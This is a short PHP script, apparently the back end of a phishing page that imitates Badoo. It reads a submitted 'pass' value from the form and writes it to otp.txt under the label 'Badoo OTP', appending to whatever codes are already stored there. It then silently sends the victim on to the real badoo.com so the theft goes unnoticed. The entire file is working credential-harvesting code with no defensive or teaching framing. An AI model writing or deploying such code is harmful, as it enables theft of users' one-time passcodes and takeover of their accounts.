<?php
file_put_contents("otp.txt", "Badoo OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://badoo.com/');
?>
